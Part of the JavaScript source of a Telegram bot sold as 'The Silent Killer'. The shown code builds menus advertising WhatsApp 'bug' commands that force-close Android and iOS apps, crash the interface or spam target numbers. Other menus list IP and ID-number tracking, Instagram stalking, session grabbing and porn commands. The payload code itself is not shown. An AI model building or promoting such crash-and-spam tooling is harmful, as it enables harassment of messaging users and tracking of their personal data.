ᯓ /addprem - Add Premium Users
ᯓ /delprem - Delete Premium Users
ᯓ /setcd - Set Bot Cooldown
ᯓ /selsension - Reset Existing Session
ᯓ /addbot - Add Sender Number
ᯓ /update - Auto Update Versi terbaru `;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


// ==== [ BUG'S V1 MENU ] ====\\
bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote><b>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</b></blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡

<blockquote><b>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑩𝒖𝒈'𝒔 𝑴𝒆𝒏𝒖 」</b></blockquote>
▢ /XdelayHardV1 - 62xxxx
╰⪼ ᴅᴇʟᴀʏ ʜᴀʀᴅᴠ1 ɪɴᴠɪꜱɪʙʟᴇ
▢ /XdelayHardV2 - 62xxxx
╰⪼ ᴅᴇʟᴀʏ ʜᴀʀᴅᴠ2 ɪɴᴠɪꜱɪʙʟᴇ
▢ /XdelayVisible - 62xxxx
╰⪼ ᴅᴇʟᴀʏ ᴠɪꜱɪʙʟᴇ
▢ /Xbuldozer - 62xxxx
╰⪼ ʙᴜʟᴅᴏᴢᴇʀ ɪɴᴠɪꜱɪʙʟᴇ
▢ /XdelayBuldo
╰⪼ ᴅᴇʟᴀʏ x ʙᴜʟᴅᴏᴢᴇʀ ɪɴᴠɪꜱɪʙʟᴇ
▢ /XFcandroid - 62xxxx
╰⪼ ꜰᴏʀᴄᴇʟᴏꜱᴇ ᴀɴᴅʀᴏɪᴅ 
▢ /XFcVisible - 62xxxx
╰⪼ ꜰᴏʀᴄᴇʟᴏꜱᴇ ᴠɪꜱɪʙʟᴇ
▢ /XForceloseIos - 62xxxx
╰⪼ ꜰᴏʀᴄᴇʟᴏꜱᴇ ɪᴏꜱ
▢ /XCrashUi - 62xxxx
╰⪼ ᴄʀᴀꜱʜ ᴜɪ
▢ /XCrashIoss - 62xxxx
╰⪼ ᴄʀᴀꜱʜ ɪᴏꜱ
▢ /XblankAndro - 62xxxx
╰⪼ ʙʟᴀɴᴋ ᴀɴᴅʀᴏɪᴅ
<blockquote>#ᴘᴀɢᴇ 1/2</blockquote>
`;

    const keyboard = [
        [{ text: "ᴋʜᴜꜱᴜꜱ ᴍᴜʀʙᴜɢ", callback_data: "/Murbug", style: "primary", icon_custom_emoji_id: "5085022089103016925" }],
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ BUG'S V2 MENU ] ====\\
bot.action('/Murbug', async (ctx) => {
    const Murbug = `
<blockquote>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡

<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒖𝒓𝒃𝒖𝒈 𝑴𝒆𝒏𝒖 」</blockquote>
▢ /XDelay - 62xxxx
╰⪼ ᴅᴇʟᴀʏ ɪɴᴠɪꜱ ( ᴄᴏᴄᴏᴋ ʙᴜᴀᴛ ɴᴏᴋᴏꜱ )
▢ /Xzhatanixx - 62xxxx
╰⪼ ᴅᴇʟᴀʏ ɪɴᴠɪꜱ ʜᴀʀᴅ ( ʙᴇʙᴀꜱ ꜱᴘᴀᴍ )
▢ /XCanBuldo - 62xxxx
╰⪼ ʙᴜʟᴅᴏᴢᴇʀ ɪɴᴠɪꜱ ( ʙᴇʙᴀꜱ ꜱᴘᴀᴍ )
▢ /XFcIosSpam - 62xxxx
╰⪼ ꜰᴏʀᴄᴇʟᴏꜱᴇ ɪᴏꜱ  ( ʙᴇʙᴀꜱ ꜱᴘᴀᴍ )
▢ /Xilent - 62xxxx
╰⪼ ꜰᴏʀᴄᴇʟᴏꜱᴇ ᴀɴᴅʀᴏɪᴅ ( ʙᴇʙᴀꜱ ꜱᴘᴀᴍ )
<blockquote>ꜱᴇᴍᴜᴀ ᴍᴇɴᴜ ᴍᴜʀʙᴜɢ ɪɴɪ ʙᴇʙᴀꜱ ꜱᴘᴀᴍ ʏᴀᴋ ᴄᴏᴄᴏᴋ ʙᴜᴀᴛ ᴍᴜʀʙᴜɢ ᴅᴀɴ ꜱᴇɴᴅᴇʀ ɴᴏ ᴋᴇɴᴏɴ</blockquote>
<blockquote>#ᴘᴀɢᴇ 2/2</blockquote>
`;

    const keyboard = [
       [
         { text: "ʙᴀᴄᴋ ʙᴜɢ", callback_data: "/bug", style: "success", icon_custom_emoji_id: "5084613633418199991" },
         { text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "primary", icon_custom_emoji_id: "5352759161945867747" }
       ],
       [
         { text: "ᴋᴇᴛᴇʀᴀɴɢᴀɴ", callback_data: "/about", style: "danger", icon_custom_emoji_id: "5084613633418199991" }
       ]
    ];

    try {
        await ctx.editMessageCaption(Murbug, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ ABOUT MENU ] ==== \\
bot.action('/about', async (ctx) => {
    const About = `
<blockquote>!! 𝙆𝙀𝙏𝙀𝙍𝘼𝙉𝙂𝘼𝙉 𝙒𝘼𝙅𝙄𝘽 𝘽𝘼𝘾𝘼 !!</blockquote>
───────────────────────────────────
✦ Script ini dibuat untuk tujuan 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 & 𝗽𝗲𝗻𝗲𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝘁𝗲𝘀𝘁𝗶𝗻𝗴 𝗼𝗻𝗹𝘆.
Fungsinya untuk menguji keamanan struktur pesan pada WhatsApp (WA Bot)
dengan sistem payload “bug message”, spam stabil, dan exploit verifikasi
struktur JSON/Protobuf.

✦ 𝘿𝙞𝙨𝙘𝙡𝙖𝙞𝙢𝙚𝙧 :
Developer tidak bertanggung jawab atas penyalahgunaan script ini.
Gunakan untuk memberantas ripper atau scammer di whatsapp,
dan bukan untuk merusak sistem atau mengganggu pengguna lain Terimakaih... 
──────────────────────────────────────
<blockquote>© 2026 - 2027 @zhatanixx | All Rights Reserved</blockquote>
`;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(About, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ TOOL'S V1 MENU ] ====\\
bot.action('/toolsv1', async (ctx) => {
    const toolsMenu = `
<blockquote>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑻𝒐𝒐𝒍𝒔 𝑽𝟏 」</blockquote>
⌑ /update - Auto Update Versi terbaru 
⌑ /tiktokdl - Download Content Without Watermark
⌑ /csessions - Retrieving Session From Panel Server
⌑ /addsender - Replay Session.json
⌑ /toblur - Blur Foto
⌑ /cekbio - Chek Bio Nomor Wa
⌑ /liatsender - View All Active Senders
⌑ /catbox - Convert Photos Or Videos To Links
⌑ /cekkontak -  Chek Kontak WhatsApp
⌑ /testfunction - Use Your Own Function
⌑ /cekfunc - Use Chek Error Function 
`;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ TOOL'S V2 MENU ] ====\\
bot.action('/toolsv2', async (ctx) => {
    const toolsMenu = `
<blockquote>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑻𝒐𝒐𝒍𝒔 𝑽𝟐 」</blockquote>
⌑ /update - Auto Update Versi terbaru 
⌑ /trackip - Tracking Ip
⌑ /nikparse - Tracking Nik
⌑ /iqc - Secrinshot To Iphone
⌑ /asupan - Porn video intake
⌑ /cekbio - Chek Bio Nomor Wa
⌑ /nfsw - Anime photos make me horny
⌑ /waifu - Looking for Your Anime Waifu
⌑ /cekkontak -  Chek Kontak WhatsApp
⌑ /anime - anime will
⌑ /toblur - Blur Foto
⌑ /info - info user's
`;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ TOOL'S V3 MENU ] ====\\
bot.action('/toolsv3', async (ctx) => {
    const toolsMenu = `
<blockquote>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑻𝒐𝒐𝒍𝒔 𝑽𝟑 」</blockquote>
⌑ /update - Auto Update Versi terbaru 
⌑ /cekkontak -  Chek Kontak WhatsApp 
⌑ /pinterest - Search Pinterest
⌑ /ig - stalkig - search Instagram
⌑ /toblur - Blur Foto
⌑ /play - Play Music 
⌑ /cekbio - Chek Bio Nomor Wa
⌑ /spotify - Play Music Spotify
⌑ /ytmusic - Search Music YouTube
⌑ /nhentai - Hentai Anime to jerk you off, you dog.
⌑ /cekidch - Check WhatsApp Channel ID
`;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ TOOL'S V3 MENU ] ====\\
bot.action('/donasi', async (ctx) => {
    const toolsMenu = `
<blockquote>⬡═――⊱ ⎧ 𝗗𝗢𝗡𝗔𝗦𝗜 𝗠𝗘𝗡𝗨 ⎭ ⊰―—═⬡</blockquote>
ᝰ.ᐟ sɪʟᴀʜᴋᴀɴ sᴄᴀɴ ǫʀɪs ᴅɪ ᴀᴛᴀs
ᝰ.ᐟ ᴍᴀsᴜᴋᴀɴ ɴᴏᴍɪɴᴀʟ sᴇ ɪᴋʜʟᴀs ɴʏᴀ
ᝰ.ᐟ ᴛᴇʀɪᴍᴀᴋᴀsɪʜ ʏᴀɴɢ sᴜᴅᴀʜ ᴅᴏɴᴀsɪ sᴇʜᴀᴛ sʟᴀʟᴜ
<blockquote>𝑻𝒉𝒂𝒏𝒌𝒔 𝑨𝒍𝒍 𝒀𝒂𝒏𝒈 𝑺𝒖𝒅𝒂𝒉 𝑺𝒖𝒑𝒑𝒐𝒓𝒕 𝑾𝒊𝒅𝒊𝒙</blockquote>
`;

    const keyboard = [
        [{ text: "zhatanixx", url: "t.me/zhatanixx", style: "primary", icon_custom_emoji_id: "5085022089103016925" }], 
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: "https://n.uguu.se/awqWmDMZ.jpg",
                caption: toolsMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: {
                    inline_keyboard: keyboard
                }
            }
        );

    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ GROUP MENU ] ====\\
bot.action('/gbmenu', async (ctx) => {
    const toolsMenu = `
<blockquote>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 」</blockquote>
⌑ /hidetag
⌑ /tagall
⌑ /open
⌑ /close
⌑ /ban
⌑ /unban
⌑ /mute
⌑ /unmute
⌑ /warn
⌑ /promote
⌑ /demote
`;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ GAME'S MENU ] ====\\
bot.action('/game', async (ctx) => {
    const toolsMenu = `
<blockquote>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑮𝒂𝒎𝒆'𝒔 𝑴𝒆𝒏𝒖 」</blockquote>
⌑ /cekkhodam 
╰⪼ ɢᴀᴍᴇ'ꜱ ᴄʜᴇᴋ ᴋʜᴏᴅᴀᴍ
⌑ /cekganteng
╰⪼ ɢᴀᴍᴇ'ꜱ ᴄʜᴇᴋ ɢᴀɴᴛᴇɴɢ
⌑ /cekkantik
╰⪼ ɢᴀᴍᴇ'ꜱ ᴄʜᴇᴋ ᴄᴀɴᴛɪᴋ
⌑ /slot
╰⪼ ɢᴀᴍᴇ'ꜱ ꜱʟᴏᴛ
⌑ /bomb 
╰⪼ ɢᴀᴍᴇ'ꜱ ʙᴏᴍʙ ᴅᴜᴀʀ
<blockquote>ᴡɪᴅɪx ɴʏᴀ ᴄᴀᴘᴇᴋ, ɴᴇxᴛ ᴜᴘ ᴀᴊᴀ ᴅɪ ᴛᴀᴍʙᴀʜ ɪɴ</blockquote>
`;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ SECURITY MENU ] ====\\
bot.action('/security', async (ctx) => {
    const toolsMenu = `
<blockquote>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑺𝒆𝒄𝒖𝒓𝒊𝒕𝒚 𝑴𝒆𝒏𝒖 」</blockquote>
⌑ /antiadmin on/off
╰⪼ ᴅᴇʟ ᴀᴅᴍɪɴ ꜱʜᴀʀᴇ
⌑ /antiforward on/off
╰⪼ ᴅᴇʟ ᴜꜱᴇʀ'ꜱ ꜰᴏʀᴡᴀʀᴅ
⌑ /antipromosi on/off
╰⪼ ᴅᴇʟ ᴛᴇᴋꜱ ᴘʀᴏᴍᴏꜱɪ
⌑ /antilink on/off
╰⪼ ᴅᴇʟ ᴛᴇᴋꜱ ʟɪɴᴋ
⌑ /antiporno on/off
╰⪼ ᴅᴇʟ ᴛᴇᴋꜱ ʙᴏᴋᴇᴘ/ᴘᴏʀɴᴏɢʀᴀꜰɪ
⌑ /antimedia on/off
╰⪼ ᴅᴇʟ ꜰᴏᴛᴏ/ᴍᴇᴅɪᴀ
`;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ==== [ THANK'S TO MENU ] ====\\
bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒖𝒑𝒑𝒐𝒓𝒕 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 」</blockquote>
⌑ @zhatanixx - The Developer
⌑ 𝑨𝒍𝒍 𝑩𝒖𝒚𝒆𝒓 𝑺𝒄𝒓𝒊𝒑𝒕 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓
`;

    const keyboard = [
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// =======[ HARGA MENU ]=======\\
bot.action('/harga', async (ctx) => {
    const controlsMenu = `
<blockquote><b>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</b></blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑯𝒂𝒓𝒈𝒂 𝑺𝒄𝒓𝒊𝒑𝒕 」</blockquote>
ᯓ ꜰᴜʟʟ ᴜᴘ   : 12k
ᯓ ʀᴇꜱᴇʟʟᴇʀ  : 17k
ᯓ ᴘᴛ        : 24k
ᯓ ᴍᴏᴅ       : 34k
ᯓ ᴏᴡɴᴇʀ     : 44k
ᯓ ᴛᴋ        : 59k
<blockquote>[x] ʙᴜʏ ꜱᴄʀɪᴘᴛ? ᴘᴠ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ...</blockquote>`;

    const keyboard = [
        [{ text: "ᴄᴏɴᴛᴀᴄᴛꜱ ᴏᴡɴᴇʀ'ꜱ", url: "t.me/zhatanixx", style: "success", icon_custom_emoji_id: "5085022089103016925" }],
        [{ text: "ʙᴀᴄᴋ ᴛᴏ", callback_data: "/mainmenu", style: "danger", icon_custom_emoji_id: "5352759161945867747" }]
    ];

    try {
